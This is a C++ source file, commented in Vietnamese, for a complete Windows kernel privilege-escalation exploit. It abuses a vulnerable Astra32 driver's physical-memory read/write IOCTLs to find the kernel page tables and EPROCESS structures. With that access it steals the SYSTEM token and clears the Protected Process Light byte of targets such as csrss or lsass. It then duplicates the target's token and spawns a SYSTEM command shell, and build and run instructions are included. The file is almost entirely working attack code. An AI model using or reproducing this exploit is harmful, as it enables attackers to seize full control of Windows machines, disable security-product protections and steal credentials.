/*
 * 3_ppl_bypass.cpp — PPL bypass bằng cách xóa EPROCESS.Protection
 *
 * Ý tưởng:
 *   Protected Process Light (PPL) ngăn OpenProcess(PROCESS_ALL_ACCESS) vào process
 *   được protect (lsass, antivirus, csrss, ...).
 *   Kernel check protection tại _EPROCESS.Protection (1 byte _PS_PROTECTION):
 *     bit 0-2: Type  (0=None, 1=PPL, 2=PP)
 *     bit 4-7: Signer (5=Windows, 6=WinTcb, 7=WinSystem, ...)
 *   Ta ghi 0x00 vào byte đó → protection biến mất → OpenProcess thành công.
 *   Sau khi lấy được handle + duplicate token, restore ngay lập tức.
 *
 * Flow:
 *   1. Init (giống token_swap): tìm CR3, kernel, EPROCESS
 *   2. Swap token → SYSTEM (cần SeAssignPrimaryToken cho CreateProcessWithTokenW)
 *   3. Scan EPROCESS list → liệt kê tất cả process có Protection != 0
 *   4. Clear EPROCESS.Protection của target
 *   5. OpenProcess(PROCESS_ALL_ACCESS) → OpenProcessToken → DuplicateTokenEx
 *   6. Restore EPROCESS.Protection ngay
 *   7. CreateProcessWithTokenW → SYSTEM shell
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:3_ppl_bypass.exe 3_ppl_bypass.cpp ^
 *      /link /subsystem:console kernel32.lib advapi32.lib ntdll.lib
 *
 * Chạy (Administrator):
 *   3_ppl_bypass.exe [process_name]   (default: csrss.exe)
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winioctl.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")

#define IOCTL_MAP_PHYS   0x80002008u
#define IOCTL_READ_MSR   0x800020ECu
#define DEVICE_PATH      "\\\\.\\Astra32Device0"
#define IA32_LSTAR       0xC0000082u
#define KUSD_VA          0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK 0xFULL

static bool is_kptr(uint64_t v) { return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL; }

#pragma pack(push,1)
struct MAP_INPUT { uint32_t interface_type, bus_number; uint64_t physical_addr; uint32_t address_space, size; };
#pragma pack(pop)

struct Astra {
    HANDLE dev = INVALID_HANDLE_VALUE; uint64_t hint_hi = 0;
    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE) printf("[-] Cannot open %s: %lu\n", DEVICE_PATH, GetLastError());
        return dev != INVALID_HANDLE_VALUE;
    }
    void close() { if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; } }
    bool read_msr(uint32_t idx, uint64_t* out) {
        uint8_t io[8] = {}; memcpy(io, &idx, 4); DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_READ_MSR, io, 4, io, 8, &ret, NULL)) return false;
        memcpy(out, io, 8); return true;
    }
    uintptr_t map_page(uint64_t phys_page) {
        MAP_INPUT inp = {}; inp.physical_addr = phys_page; inp.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS, &inp, sizeof(inp), &inp, sizeof(inp), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)inp.interface_type; if (!lo) return 0;
        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo; MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0 && mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
            };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) { if (hi == hint_hi) continue; if (auto va = try_hi(hi)) { hint_hi = hi; return va; } }
        return 0;
    }
    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }
    static bool safe_copy(uintptr_t src, void* dst, size_t n) { SIZE_T rd = 0; return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n; }
    bool read_phys(uint64_t addr, void* buf, size_t len) {
        auto* dst = (uint8_t*)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page); if (!va) return false;
            bool ok = safe_copy(va + off, dst + pos, chunk); unmap(va); if (!ok) return false;
            pos += chunk; addr += chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr, const void* buf, size_t len) {
        auto* src = (const uint8_t*)buf;
        for (size_t pos = 0; pos < len; ) {
            uint64_t page = addr & ~(uint64_t)0xFFF; size_t off = (size_t)(addr & 0xFFF), chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(page); if (!va) return false;
            memcpy((void*)(va + off), src + pos, chunk); unmap(va); pos += chunk; addr += chunk;
        }
        return true;
    }
    bool read_u8(uint64_t pa, uint8_t* v) { return read_phys(pa, v, 1); }
    bool read_u32(uint64_t pa, uint32_t* v) { return read_phys(pa, v, 4); }
    bool read_u64(uint64_t pa, uint64_t* v) { return read_phys(pa, v, 8); }
    bool write_u8(uint64_t pa, uint8_t  v) { return write_phys(pa, &v, 1); }
    bool write_u64(uint64_t pa, uint64_t v) { return write_phys(pa, &v, 8); }
};

static bool virt_to_phys(Astra* d, uint64_t cr3, uint64_t va, uint64_t* pa) {
    auto idx = [&](int lvl) { return (va >> (12 + lvl * 9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_u64((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3) * 8, &e) || !(e & 1)) return false;
    if (!d->read_u64((e & 0x000FFFFFFFFFF000ULL) + idx(2) * 8, &e) || !(e & 1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; }
    if (!d->read_u64((e & 0x000FFFFFFFFFF000ULL) + idx(1) * 8, &e) || !(e & 1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL); return true; }
    if (!d->read_u64((e & 0x000FFFFFFFFFF000ULL) + idx(0) * 8, &e) || !(e & 1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL); return true;
}
static bool vread(Astra* d, uint64_t cr3, uint64_t va, void* buf, size_t len) {
    auto* dst = (uint8_t*)buf;
    for (size_t pos = 0; pos < len; ) {
        size_t off = (size_t)(va & 0xFFF), chunk = std::min(len - pos, (size_t)(0x1000 - off));
        uint64_t pa; if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst + pos, chunk)) return false; pos += chunk; va += chunk;
    }
    return true;
}
static bool vread_u64(Astra* d, uint64_t cr3, uint64_t va, uint64_t* v) { return vread(d, cr3, va, v, 8); }
static bool vread_u8(Astra* d, uint64_t cr3, uint64_t va, uint8_t* v) { return vread(d, cr3, va, v, 1); }

static uint64_t find_cr3(Astra* d) {
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB for CR3...\n");
    std::vector<uint64_t> cands;
    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0; if (!d->read_u64(pg + idx * 8, &e) || !(e & 1)) continue;
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue; cands.push_back(pg);
    }
    printf("[*] %zu candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa; uint32_t v = 0;
        if (virt_to_phys(d, cr3, KUSD_VA, &pa) && d->read_u32(pa + 0x26C, &v) && v == 10) return cr3;
    }
    return 0;
}
typedef NTSTATUS(NTAPI* pfnNtQSI)(ULONG, PVOID, ULONG, PULONG);
struct RTL_MOD { PVOID Section; PVOID MappedBase; PVOID ImageBase; ULONG ImageSize, Flags; USHORT LoadOrderIdx, InitOrderIdx, LoadCount, NameOffset; CHAR FullName[256]; };
struct RTL_MODS { ULONG Count; RTL_MOD Mods[1]; };
static uint64_t get_nt_kbase() {
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!NtQSI) return 0;
    ULONG sz = 0x20000; RTL_MODS* buf = NULL; NTSTATUS st;
    do {
        free(buf); buf = (RTL_MODS*)malloc(sz); if (!buf) return 0;
        st = NtQSI(11, buf, sz, &sz);
    } while (st == (NTSTATUS)0xC0000004L);
    if (st) { free(buf); return 0; }
    uint64_t base = 0;
    for (ULONG i = 0; i < buf->Count; i++) {
        const char* fn = buf->Mods[i].FullName + buf->Mods[i].NameOffset;
        if (_stricmp(fn, "ntoskrnl.exe") == 0) { base = (uint64_t)(uintptr_t)buf->Mods[i].ImageBase; break; }
    }
    free(buf); return base;
}
static uintptr_t load_image(const char* n) { return (uintptr_t)LoadLibraryExA(n, NULL, DONT_RESOLVE_DLL_REFERENCES); }
static uint64_t export_rva(uintptr_t base, const char* name) {
    FARPROC p = GetProcAddress((HMODULE)base, name); return p ? (uint64_t)((uintptr_t)p - base) : 0;
}

struct EpOff { uint64_t pid, links, token; uint32_t prot; };
static EpOff detect_ep_offsets() {
    typedef NTSTATUS(NTAPI* fn)(PRTL_OSVERSIONINFOW);
    auto f = (fn)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
    RTL_OSVERSIONINFOW ov = {}; ov.dwOSVersionInfoSize = sizeof(ov); if (f) f(&ov);
    printf("[*] Build: %lu\n", ov.dwBuildNumber);
    if (ov.dwBuildNumber >= 26100) return { 0x1D0, 0x1D8, 0x248, 0x4FA };  // Win11 24H2+
    return { 0x440, 0x448, 0x4B8, 0x87A };                                   // Win10 / Win11 <24H2
}
static bool find_eprocess(Astra* d, uint64_t cr3, uint64_t nt_kbase, uintptr_t nt_disk,
    const EpOff& ep, uint32_t tgt_pid, uint64_t* sys_ep, uint64_t* tgt_ep) {
    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess"); if (!rva) return false;
    uint64_t se = 0; if (!vread_u64(d, cr3, nt_kbase + rva, &se) || !is_kptr(se)) return false;
    uint64_t spid = 0; vread_u64(d, cr3, se + ep.pid, &spid); if (spid != 4) return false;
    *sys_ep = se; if (tgt_pid == 4) { *tgt_ep = se; return true; }
    uint64_t head = 0, flink = 0;
    if (!vread_u64(d, cr3, se + ep.links + 8, &head) || !is_kptr(head)) return false;
    if (!vread_u64(d, cr3, head, &flink)) return false;
    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - ep.links, pid = 0;
        if (vread_u64(d, cr3, ep_va + ep.pid, &pid) && (uint32_t)pid == tgt_pid) { *tgt_ep = ep_va; return true; }
        uint64_t nxt = 0; if (!vread_u64(d, cr3, flink, &nxt) || !is_kptr(nxt)) break; flink = nxt;
    }
    return false;
}

// ════════════════════════════════════════════════════════════
//   Scan toàn bộ EPROCESS list, tìm process có Protection != 0
//   Dùng 1 page walk / iteration để nhanh hơn (3x so với 3 walk riêng)
// ════════════════════════════════════════════════════════════
struct PplEntry {
    uint64_t ep_va;
    uint32_t pid;
    uint8_t prot;
    char name[64];
};

static std::vector<PplEntry> find_ppl_processes(Astra* d, uint64_t cr3,
    uint64_t nt_kbase, uintptr_t nt_disk,
    const EpOff& ep)
{
    std::vector<PplEntry> result;

    const int MAX_SCAN = 64;
    const size_t MAX_RESULT = 16;

    printf("[DBG] enter find_ppl_processes\n");
    fflush(stdout);

    uint64_t rva = export_rva(nt_disk, "PsInitialSystemProcess");
    printf("[DBG] PsInitialSystemProcess RVA = 0x%llX\n", (unsigned long long)rva);
    fflush(stdout);

    if (!rva)
        return result;

    uint64_t se = 0;
    if (!vread_u64(d, cr3, nt_kbase + rva, &se) || !is_kptr(se)) {
        printf("[-] failed read PsInitialSystemProcess: se=0x%llX\n",
            (unsigned long long)se);
        fflush(stdout);
        return result;
    }

    printf("[DBG] System EPROCESS = 0x%llX\n", (unsigned long long)se);
    printf("[DBG] offsets: pid=0x%llX links=0x%llX prot=0x%X\n",
        (unsigned long long)ep.pid,
        (unsigned long long)ep.links,
        ep.prot);
    fflush(stdout);

    uint64_t test_pid = 0;
    if (!vread_u64(d, cr3, se + ep.pid, &test_pid)) {
        printf("[-] failed read System PID\n");
        fflush(stdout);
        return result;
    }

    printf("[DBG] System PID = %llu\n", (unsigned long long)test_pid);
    fflush(stdout);

    if (test_pid != 4) {
        printf("[-] bad EPROCESS offsets, System PID != 4\n");
        fflush(stdout);
        return result;
    }

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    auto get_name = [&](uint32_t pid) -> const char* {
        static char buf[MAX_PATH];

        ZeroMemory(buf, sizeof(buf));

        if (snap == INVALID_HANDLE_VALUE) {
            sprintf_s(buf, sizeof(buf), "pid%u", pid);
            return buf;
        }

        PROCESSENTRY32W pe = {};
        pe.dwSize = sizeof(pe);

        if (Process32FirstW(snap, &pe)) {
            do {
                if (pe.th32ProcessID == pid) {
                    int ok = WideCharToMultiByte(
                        CP_ACP,
                        0,
                        pe.szExeFile,
                        -1,
                        buf,
                        (int)sizeof(buf),
                        NULL,
                        NULL
                    );

                    if (ok <= 0)
                        sprintf_s(buf, sizeof(buf), "pid%u", pid);

                    buf[sizeof(buf) - 1] = '\0';
                    return buf;
                }
            } while (Process32NextW(snap, &pe));
        }

        sprintf_s(buf, sizeof(buf), "pid%u", pid);
        return buf;
        };

    uint64_t head = se + ep.links;
    uint64_t flink = 0;
    uint64_t blink = 0;

    if (!vread_u64(d, cr3, head, &flink)) {
        printf("[-] failed read head->Flink\n");
        fflush(stdout);
        if (snap != INVALID_HANDLE_VALUE)
            CloseHandle(snap);
        return result;
    }

    if (!vread_u64(d, cr3, head + 8, &blink)) {
        printf("[-] failed read head->Blink\n");
        fflush(stdout);
        if (snap != INVALID_HANDLE_VALUE)
            CloseHandle(snap);
        return result;
    }

    printf("[DBG] head=0x%llX flink=0x%llX blink=0x%llX\n",
        (unsigned long long)head,
        (unsigned long long)flink,
        (unsigned long long)blink);
    fflush(stdout);

    if (!is_kptr(flink)) {
        printf("[-] invalid first flink\n");
        fflush(stdout);
        if (snap != INVALID_HANDLE_VALUE)
            CloseHandle(snap);
        return result;
    }

    {
        uint8_t prot = 0;

        if (vread_u8(d, cr3, se + ep.prot, &prot)) {
            printf("[DBG] System prot = 0x%02X\n", prot);
            fflush(stdout);

            if (prot) {
                PplEntry e{};
                e.ep_va = se;
                e.pid = 4;
                e.prot = prot;
                strncpy_s(e.name, sizeof(e.name), "System", _TRUNCATE);
                result.push_back(e);
            }
        }
        else {
            printf("[-] failed read System prot\n");
            fflush(stdout);
        }
    }

    for (int count = 0; count < MAX_SCAN && flink != head; count++) {
        printf("[DBG] loop %d flink=0x%llX\n",
            count,
            (unsigned long long)flink);
        fflush(stdout);

        if (!is_kptr(flink)) {
            printf("[-] invalid flink at %d: 0x%llX\n",
                count,
                (unsigned long long)flink);
            fflush(stdout);
            break;
        }

        uint64_t ep_va = flink - ep.links;
        uint64_t pid = 0;
        uint64_t nxt = 0;
        uint8_t prot = 0;

        if (!vread_u64(d, cr3, ep_va + ep.pid, &pid)) {
            printf("[-] read pid failed at %d ep=0x%llX\n",
                count,
                (unsigned long long)ep_va);
            fflush(stdout);
            break;
        }

        if (!vread_u64(d, cr3, flink, &nxt)) {
            printf("[-] read next failed at %d flink=0x%llX\n",
                count,
                (unsigned long long)flink);
            fflush(stdout);
            break;
        }

        if (!vread_u8(d, cr3, ep_va + ep.prot, &prot)) {
            printf("[-] read prot failed at %d ep=0x%llX\n",
                count,
                (unsigned long long)ep_va);
            fflush(stdout);
            break;
        }

        const char* pname = get_name((uint32_t)pid);

        printf("[DBG] %04d ep=0x%llX pid=%llu prot=0x%02X nxt=0x%llX name=%s\n",
            count,
            (unsigned long long)ep_va,
            (unsigned long long)pid,
            prot,
            (unsigned long long)nxt,
            pname);
        fflush(stdout);

        if (prot && pid) {
            PplEntry e{};
            e.ep_va = ep_va;
            e.pid = (uint32_t)pid;
            e.prot = prot;
            strncpy_s(e.name, sizeof(e.name), pname, _TRUNCATE);
            result.push_back(e);

            if (result.size() >= MAX_RESULT) {
                printf("[DBG] enough PPL entries, stop early\n");
                fflush(stdout);
                break;
            }
        }

        if (!is_kptr(nxt)) {
            printf("[-] invalid nxt at %d: 0x%llX\n",
                count,
                (unsigned long long)nxt);
            fflush(stdout);
            break;
        }

        if (nxt == flink) {
            printf("[-] self-loop at %d\n", count);
            fflush(stdout);
            break;
        }

        flink = nxt;
    }

    printf("[DBG] leave find_ppl_processes, found=%zu\n", result.size());
    fflush(stdout);

    if (snap != INVALID_HANDLE_VALUE)
        CloseHandle(snap);

    return result;
}

// ════════════════════════════════════════════════════════════
//   Decode _PS_PROTECTION byte thành chuỗi dễ đọc
// ════════════════════════════════════════════════════════════
static const char* prot_str(uint8_t p) {
    static char buf[48];
    const char* types[] = { "None","PPL","PP","??" };
    const char* signers[] = { "None","Authenticode","CodeGen","Antimalware",
                              "Lsa","Windows","WinTcb","WinSystem" };
    uint8_t type = p & 7, signer = (p >> 4) & 0xF;
    sprintf_s(buf, "%s/%s (0x%02X)", types[type < 4 ? type : 3],
        signers[signer < 8 ? signer : 0], p);
    return buf;
}

// ════════════════════════════════════════════════════════════
//   main
// ════════════════════════════════════════════════════════════
int main(int argc, char** argv) {
    const char* target_name = (argc >= 2) ? argv[1] : "csrss.exe";
    printf("\n=== Technique 3: PPL Bypass (target: %s) ===\n\n", target_name);

    Astra drv; if (!drv.open()) return 1;

    uint64_t cr3 = find_cr3(&drv);
    if (!cr3) { printf("[-] CR3\n"); return 1; }
    printf("[+] CR3   = 0x%llX\n", (unsigned long long)cr3);

    uint64_t nt_kbase = get_nt_kbase();
    if (!nt_kbase) { printf("[-] ntoskrnl not found via NtQSI\n"); return 1; }
    printf("[+] ntoskrnl = 0x%llX\n", (unsigned long long)nt_kbase);

    uintptr_t nt_disk = load_image("ntoskrnl.exe");
    if (!nt_disk) { printf("[-] LoadLibraryEx\n"); return 1; }

    EpOff ep = detect_ep_offsets();
    printf("[*] Protection offset = +0x%X\n", ep.prot);

    uint32_t my_pid = GetCurrentProcessId();
    uint64_t sys_ep = 0, my_ep = 0;
    if (!find_eprocess(&drv, cr3, nt_kbase, nt_disk, ep, my_pid, &sys_ep, &my_ep)) return 1;
    printf("[+] System EPROCESS = 0x%llX\n", (unsigned long long)sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (unsigned long long)my_ep);

    // Token swap → SYSTEM (cần SeAssignPrimaryToken để CreateProcessWithTokenW)
    uint64_t pa_sys_tok = 0, pa_my_tok = 0, sys_tok = 0, orig_tok = 0;
    virt_to_phys(&drv, cr3, sys_ep + ep.token, &pa_sys_tok);
    virt_to_phys(&drv, cr3, my_ep + ep.token, &pa_my_tok);
    drv.read_u64(pa_sys_tok, &sys_tok);
    drv.read_u64(pa_my_tok, &orig_tok);
    printf("[*] Swapping token → SYSTEM...\n");
    drv.write_u64(pa_my_tok, sys_tok);
    printf("[+] Now SYSTEM\n");

    // Scan EPROCESS list → liệt kê PPL processes
    printf("[*] Scanning EPROCESS for PPL processes...\n");
    auto ppl_list = find_ppl_processes(&drv, cr3, nt_kbase, nt_disk, ep);

    if (ppl_list.empty()) {
        printf("[-] No PPL processes found (check Protection offset)\n");
        // Restore token
        Astra d2; d2.open(); uint64_t p2 = 0;
        if (virt_to_phys(&d2, cr3, my_ep + ep.token, &p2)) d2.write_u64(p2, orig_tok);
        d2.close(); return 1;
    }

    printf("\n[*] PPL processes on this system:\n");
    printf("    %-6s  %-22s  %s\n", "PID", "Name", "Protection");
    printf("    %-6s  %-22s  %s\n", "------", "----------------------", "-----------");
    for (auto& e : ppl_list)
        printf("    %-6u  %-22s  %s\n", e.pid, e.name, prot_str(e.prot));

    // Tìm target
    PplEntry* target = nullptr;
    for (auto& e : ppl_list)
        if (_stricmp(e.name, target_name) == 0) { target = &e; break; }
    if (!target) {
        // Auto-pick: bỏ qua System và smss (không có token hữu ích)
        const char* skip[] = { "System","smss.exe" };
        for (auto& e : ppl_list) {
            bool ok = true;
            for (auto s : skip) if (_stricmp(e.name, s) == 0) { ok = false; break; }
            if (ok) { target = &e; break; }
        }
    }
    if (!target) { printf("[-] No suitable PPL target found\n"); return 1; }

    printf("\n[*] Target: %s (PID %u)  %s\n", target->name, target->pid, prot_str(target->prot));

    // Lấy PA của EPROCESS.Protection
    uint64_t prot_pa = 0;
    if (!virt_to_phys(&drv, cr3, target->ep_va + ep.prot, &prot_pa)) {
        printf("[-] Cannot translate Protection field\n"); return 1;
    }
    uint8_t orig_prot = target->prot;

    // Kiểm tra trước khi patch
    HANDLE h_test = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
    printf("[*] OpenProcess before bypass: %s\n", h_test ? "already accessible" : "FAILED (expected)");
    if (h_test) CloseHandle(h_test);

    // ── PATCH ──
    printf("[*] Clearing EPROCESS.Protection (PA=0x%llX): 0x%02X → 0x00\n",
        (unsigned long long)prot_pa, orig_prot);
    drv.write_u8(prot_pa, 0x00);

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target->pid);
    if (!hProc) {
        printf("[-] OpenProcess still failed: %lu\n", GetLastError());
        drv.write_u8(prot_pa, orig_prot); return 1;
    }
    printf("[+] OpenProcess(PROCESS_ALL_ACCESS, %u) → SUCCESS\n", target->pid);

    HANDLE hTok = NULL, hNew = NULL;
    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &hTok))
        printf("[-] OpenProcessToken: %lu\n", GetLastError());
    else {
        if (!DuplicateTokenEx(hTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNew))
            printf("[-] DuplicateTokenEx: %lu\n", GetLastError());
        else
            printf("[+] Token duplicated from %s\n", target->name);
        CloseHandle(hTok);
    }

    // ── RESTORE ngay lập tức ──
    drv.write_u8(prot_pa, orig_prot);
    printf("[+] EPROCESS.Protection restored to 0x%02X\n", orig_prot);
    CloseHandle(hProc);

    // Spawn shell với token duplicate
    if (hNew) {
        STARTUPINFOW si = { sizeof(si) }; PROCESS_INFORMATION pi = {};
        wchar_t cmd[] = L"cmd.exe";
        if (CreateProcessWithTokenW(hNew, LOGON_WITH_PROFILE, NULL, cmd,
            CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[+] Shell spawned from %s token (PID %lu)\n", target->name, pi.dwProcessId);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
        }
        else {
            printf("[-] CreateProcessWithTokenW: %lu\n", GetLastError());
        }
        CloseHandle(hNew);
    }

    // Restore token của mình
    Sleep(2000);
    Astra drv2; drv2.open(); uint64_t pa2 = 0;
    if (virt_to_phys(&drv2, cr3, my_ep + ep.token, &pa2)) drv2.write_u64(pa2, orig_tok);
    drv2.close();
    printf("[+] Our token restored.\n");

    drv.close();
    return 0;
}
